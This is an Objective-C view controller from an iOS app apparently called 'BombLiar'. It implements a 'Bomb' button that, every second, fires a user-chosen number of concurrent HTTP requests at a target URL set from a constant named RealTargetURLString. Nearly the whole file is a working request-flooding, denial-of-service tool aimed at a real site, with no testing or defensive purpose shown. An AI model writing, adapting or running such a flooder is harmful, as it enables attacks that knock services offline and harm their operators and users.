//
//  BombViewController.m
//  BombLiar
//
//  Created by VooleDev6 on 14-3-31.
//  Copyright (c) 2014年 VooleDev6. All rights reserved.
//



#define BombTimes  20

#import "ASIHTTPRequest.h"
#import "ConstConfig.h"


#import "BombViewController.h"



@interface BombViewController ()<ASIHTTPRequestDelegate>{
    @private
    IBOutlet UILabel*targetLabel;
    IBOutlet UITextField*tfDensity;
    IBOutlet UITextField*tfDuration;
    IBOutlet UIButton*buttonBomb;
    
    
    
    NSInteger currentSecond;
    
}
@property(nonatomic,strong)NSTimer*bombTimer;

@end

@implementation BombViewController

@synthesize bombTimer;

- (IBAction)bombButtonClicked:(id)sender {
    
    
    if (NO==buttonBomb.selected) {
        self.bombTimer.fireDate=[NSDate date];
        buttonBomb.selected=YES;
        
    }
    else{
        self.bombTimer.fireDate=[NSDate distantFuture];
        buttonBomb.selected=NO;
    }
}

-(void)timerFiredAction:(NSTimer*)timer{
 
    currentSecond++;
  
    tfDuration.text=[NSString stringWithFormat:@"%ld",(long)currentSecond];
    [self startBomb];

}
-(void)startBomb{
    
    NSURL*targetURL=[NSURL URLWithString:targetLabel.text];
    NSInteger minute=[tfDuration.text intValue];
    NSInteger density=[tfDensity.text intValue];
    [self startBomb:targetURL duration:minute density: density];
    

}

-(void)startBomb:(NSURL*)targetUrl duration:(NSInteger)duration density:(NSInteger)density{
    
    [self gcdAsiGroupRequest:targetUrl duration:duration density:density];
    return;
    for (NSInteger requestIndex=0;requestIndex<density;requestIndex++) {
        
        
        //[self gcdDataRequest:targetUrl duration:duration requestIndex:requestIndex];
        //[self gcdAsiRequest:targetUrl duration:duration requestIndex:requestIndex];
        
        
        
    }
    // NSLog(@"Duration %i bomb finished",duration);

}

-(void)gcdAsiGroupRequest:(NSURL*)targetUrl duration:(NSInteger)duration density:(NSInteger)density{
    
    dispatch_queue_t queue=dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
    dispatch_group_t group=dispatch_group_create();
   

    for (NSInteger requestIndex=0; requestIndex<density;requestIndex++) {
            
        
        dispatch_group_async(group, queue, ^{
            @autoreleasepool {
                NSData*data=[NSData dataWithContentsOfURL:targetUrl];
                if (nil!=data) {
                    NSString*dataString=[[NSString alloc]initWithData:data encoding:NSASCIIStringEncoding];
                    dispatch_async(dispatch_get_main_queue(), ^{
                        NSLog(@"The result string is %@",dataString);
                    
                    });
                }
                else{
                    dispatch_async(dispatch_get_main_queue(), ^{
                        NSLog(@"Failed");
                    });
                }


            }});

    }
    
}
-(void)gcdAsiRequest:(NSURL*)targetUrl duration:(NSInteger)duration requestIndex:(NSInteger)requestIndex{
    
    
    NSString*queueName=[NSString stringWithFormat:@"AsiRequestQueue_%li_%li",(long)duration,(long)requestIndex];
    const char*charQueue=[queueName cStringUsingEncoding:NSASCIIStringEncoding];
    dispatch_queue_t queue=dispatch_queue_create(charQueue, nil);
    dispatch_async(queue, ^{
        ASIHTTPRequest*requet=[ASIHTTPRequest requestWithURL:targetUrl];
        requet.delegate=self;
        requet.tag=requestIndex;
        [requet startSynchronous];
        NSLog(@"The reuslt is %@",requet.responseString);
    
    });

    
     
}

-(void)gcdDataRequest:(NSURL*)targetUrl duration:(NSInteger)duration requestIndex:(NSInteger)requestIndex{
    NSString*queueName=[NSString stringWithFormat:@"DataRequestQueue_%li_%li",(long)duration,(long)requestIndex];
    const char*charQueue=[queueName cStringUsingEncoding:NSASCIIStringEncoding];
    dispatch_queue_t queue=dispatch_queue_create(charQueue, nil);
    dispatch_async(queue, ^{
        NSData*data=[NSData dataWithContentsOfURL:targetUrl];
        if (nil!=data) {
            NSString*dataString=[[NSString alloc]initWithData:data encoding:NSASCIIStringEncoding];
            NSLog(@"The request %li reuslt is %@",(long)requestIndex,dataString);
            
        }
        else{
            NSLog(@"Request %li Failed",(long)requestIndex);
        }
    });
    
    
}

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization
    }
    return self;
}

- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    //targetLabel.text=SampleTargetURLString;
    targetLabel.text=RealTargetURLString;
    
    [buttonBomb setTitle:@"Pause" forState:UIControlStateSelected];
    [buttonBomb setTitle:@"Bomb" forState:UIControlStateNormal];
    
    dispatch_queue_t queue=dispatch_queue_create("Timer", nil);
    dispatch_async(queue, ^{
        self.bombTimer=[NSTimer scheduledTimerWithTimeInterval:1.0 target:self selector:@selector(timerFiredAction:) userInfo:nil repeats:YES];
        self.bombTimer.fireDate=[NSDate distantFuture];
        [[NSRunLoop currentRunLoop] run];
        
    });
}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

/*
#pragma mark - Navigation

// In a storyboard-based application, you will often want to do a little preparation before navigation
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    // Get the new view controller using [segue destinationViewController].
    // Pass the selected object to the new view controller.
}
*/

#pragma AsiHttpRequest delegate messages

-(void)requestFinished:(ASIHTTPRequest *)request{
    NSLog(@"The request %li finished,the Result is %@",(long)request.tag,request.responseString );
}
-(void)requestFailed:(ASIHTTPRequest *)request{
    NSLog(@"Failed request %li for reason:%@",(long)request.tag,request.responseString);
}

@end
